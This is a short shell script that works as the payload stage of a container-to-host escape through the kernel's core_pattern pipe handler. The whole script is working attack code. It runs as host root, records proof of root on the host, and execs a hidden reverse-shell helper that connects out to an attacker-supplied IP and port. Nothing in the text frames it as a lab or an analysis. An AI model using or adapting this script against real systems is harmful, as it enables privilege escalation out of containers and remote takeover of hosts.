#!/bin/sh
# core_pattern pipe handler — runs as HOST root inside the kernel
# usermodehelper context (init namespaces, root filesystem).
#
# Invoked by the kernel as:  <handler> <ATTACKER_IP> <PORT>
# (everything after the handler path in core_pattern becomes argv)
#
# 1. Prove we are uid 0 on the host.
# 2. Drain the incoming core dump (the kernel pipes it to our stdin).
# 3. Hand over to the static revsh helper (no nc//dev/tcp needed).

ATTACKER_IP="${1:?usage: handler <IP> <PORT>}"
PORT="${2:?usage: handler <IP> <PORT>}"

SELF="$(readlink -f "$0" 2>/dev/null || echo "$0")"
DIR="$(dirname "$SELF")"

# drain the incoming core dump first, or the kernel's dump writer blocks
(cat > /dev/null 2>/dev/null || true)

echo "core-pattern escape fired $(date +%s)" >> /root/core-escape-proof
id >> /root/core-escape-proof

exec "$DIR/.revsh" "$ATTACKER_IP" "$PORT" < /dev/null